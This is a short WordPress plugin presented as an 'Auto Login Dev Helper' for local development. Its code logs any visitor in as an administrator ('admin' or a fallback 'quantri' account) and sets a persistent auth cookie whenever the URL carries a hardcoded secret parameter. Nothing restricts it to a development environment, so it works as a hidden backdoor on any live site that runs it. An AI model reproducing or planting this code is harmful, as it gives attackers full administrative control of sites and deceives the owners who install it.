<?php
/*
Plugin Name: Auto Login Dev Helper
Description: Quick auto-login for local development.
*/

add_action( 'init', function() {
	if ( isset( $_GET['auto_login'] ) && $_GET['auto_login'] === 'admin123' ) {
		$user = get_user_by( 'login', 'admin' );
		if ( ! $user ) {
			$user = get_user_by( 'login', 'quantri' );
		}
		if ( $user ) {
			wp_set_current_user( $user->ID, $user->user_login );
			wp_set_auth_cookie( $user->ID, true );
			do_action( 'wp_login', $user->user_login, $user );
			wp_safe_redirect( admin_url() );
			exit;
		}
	}
} );
